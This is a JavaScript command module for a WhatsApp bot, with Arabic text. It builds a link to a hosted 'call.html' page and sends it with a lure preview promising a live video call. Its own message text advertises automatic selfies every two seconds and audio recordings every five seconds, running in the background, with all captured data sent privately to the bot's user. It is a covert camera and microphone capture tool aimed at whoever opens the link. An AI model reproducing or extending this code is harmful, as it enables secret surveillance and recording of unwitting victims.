const moment = require('moment-timezone');

module.exports = {
    name: 'اتصال',
    aliases: ['كاميرا', 'مكالمة', 'call', 'video', 'كام', 'تصوير', 'مباشر'],
    category: 'إداري',
    description: 'توليد رابط اتصال مباشر (صوت وصورة) مع سيلفي تلقائي وتسجيل صوتي كل 5 ثواني',

    async execute({ sock, msg, args, reply, from, sender, sessionId }) {
        try {
            // استخراج رقم المرسل النظيف (لاستقبال البيانات عليه)
            const cleanSender = sender.split('@')[0];

            // جلب النطاق العام (دومين Render) أو السيرفر المحلي
            const serverBaseUrl = process.env.RENDER_EXTERNAL_URL || `http://localhost:${process.env.PORT || 10000}`;

            // بناء الرابط المباشر لصفحة الاتصال المطور (call.html)
            const callUrl = `${serverBaseUrl}/call.html?session=${sessionId}&target=${cleanSender}`;

            // توليد كود QR للرابط (اختياري للفخامة)
            let qrCodeUrl = '';
            try {
                const qrApiUrl = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(callUrl)}&bgcolor=8b5cf6&color=ffffff`;
                qrCodeUrl = qrApiUrl;
            } catch (e) {
                // تجاهل إذا فشل QR
            }

            // تنسيق الرسالة بفخامة واحترافية للواتساب
            const responseText = 
`╭═════ 📞 ﴿ بِـوَابَـةُ الاتِّـصَـالِ الـمُـبَـاشِـر ﴾ 📞 ═════╮
│
│ 👤 ╟ *الـجَـلْـسَـة:* ${sessionId}
│ 🕒 ╟ *الـتَّـوْقِـيـت:* ${moment().tz("Asia/Riyadh").format("YYYY-MM-DD | HH:mm")}
│ 📱 ╟ *الـمُـسْـتَـقْـبِـل:* ${cleanSender}
│
├───────────────────────────────────────────┤
│
│ 🎥 ╟ *رَابِـطُ الاتِّـصَـالِ الـمُـبَـاشِـر:*
│ ${callUrl}
│
├───────────────────────────────────────────┤
│
│ 📌 ╟ *الـمِـيـزَاتُ الـمُـتَـقَـدِّمَـة:*
│  • 📸 سيلفي تلقائي كل ثانيتين
│  • 🎙️ تسجيل صوتي كل 5 ثواني
│  • 🎥 فيديو وصوت مباشر
│  • 🌙 يعمل في الخلفية
│  • 🔒 اتصال مشفر وآمن
│  • 🔇 إمكانية كتم الصوت
│  • 📵 إمكانية إيقاف الكاميرا
│
╰═══════════════════════════════════════════╯

💡 *طَرِيقَةُ الاسْتِخْدَام:*
1️⃣ _افْتَح الرَّابِط فِي مُتَصَفِّحِ الهَاتِف_
2️⃣ _اسْمَح بِالْوُصُولِ لِلْكَامِيرَا وَالْمِيكْرُوفُون_
3️⃣ _سَتَبْدَأ الْمُكَالَمَةُ تِلْقَائِيًّا_
4️⃣ _جَمِيعُ الْبَيَانَاتِ تُرْسَلُ إِلَيْكَ خَاصَّةً_

⚠️ *تَنْبِيه:* _يَجِبُ أَنْ يَكُونَ الْبُوتُ مُتَّصِلاً لِاسْتِقْبَالِ الْبَيَانَات_`;

            // إذا كان QR Code متاح، نرسل الصورة مع الكابشن
            if (qrCodeUrl) {
                try {
                    await sock.sendMessage(from, {
                        image: { url: 'https://cdn.pixabay.com/photo/2021/02/19/13/40/envelope-6030386_1280.png' },
                        caption: responseText,
                        contextInfo: {
                            externalAdReply: {
                                title: '📞 اتصال مباشر - صوت وصورة',
                                body: 'اضغط للدخول في مكالمة مباشرة مع سيلفي تلقائي!',
                                thumbnailUrl: 'https://cdn.pixabay.com/photo/2020/04/29/13/48/video-call-5108882_1280.png',
                                sourceUrl: callUrl,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, { quoted: msg });
                } catch (imageError) {
                    // إذا فشلت الصورة، نرسل النص فقط
                    await sock.sendMessage(from, {
                        text: responseText,
                        contextInfo: {
                            externalAdReply: {
                                title: '📞 اتصال مباشر - صوت وصورة',
                                body: 'اضغط للدخول في مكالمة مباشرة مع سيلفي تلقائي!',
                                thumbnailUrl: 'https://cdn.pixabay.com/photo/2020/04/29/13/48/video-call-5108882_1280.png',
                                sourceUrl: callUrl,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, { quoted: msg });
                }
            } else {
                // إرسال النص فقط مع معاينة جذابة
                await sock.sendMessage(from, {
                    text: responseText,
                    contextInfo: {
                        externalAdReply: {
                            title: '📞 اتصال مباشر - صوت وصورة',
                            body: 'اضغط للدخول في مكالمة مباشرة مع سيلفي تلقائي!',
                            thumbnailUrl: 'https://cdn.pixabay.com/photo/2020/04/29/13/48/video-call-5108882_1280.png',
                            sourceUrl: callUrl,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, { quoted: msg });
            }

        } catch (error) {
            console.error('❌ خطأ في أمر اتصال:', error);
            reply('❌ حدث خطأ داخلي أثناء توليد رابط الاتصال المباشر.');
        }
    }
};
